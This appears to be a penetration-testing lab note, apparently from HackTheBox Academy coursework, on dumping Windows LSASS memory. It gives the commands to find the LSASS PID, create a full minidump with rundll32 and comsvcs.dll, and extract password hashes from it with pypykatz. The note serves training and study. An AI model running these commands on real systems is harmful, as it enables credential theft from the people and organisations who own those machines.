# Attacking LSASS

![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/50328b82-c010-46a7-af18-15c5516cb677)

Upon initial logon, LSASS will:

1) Cache credentials locally in memory
2) Create access tokens
3) Enforce security policies
4) Write to Windows security log

# Rundll32.exe & Comsvcs.dll Method
 First of all we have to find lsass pid
```bash
tasklist /svc
```
![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/564013af-c946-4535-b81d-2bdce653888e)
We can see PID of lsass is `672`<br>
From powershell:
```bash
Get-Process lsass
```
![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/8c135bc0-9a1f-44a2-a432-cdee2a4b815e)
<br>Once we have the PID assigned to the LSASS process, we can create the dump file.

From powershell:
```bash
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
and then we will transfer file to linux machine then we will use `pypykatz` to dump hashes:
```bash
pypykatz lsa minidump lsass.dmp
```
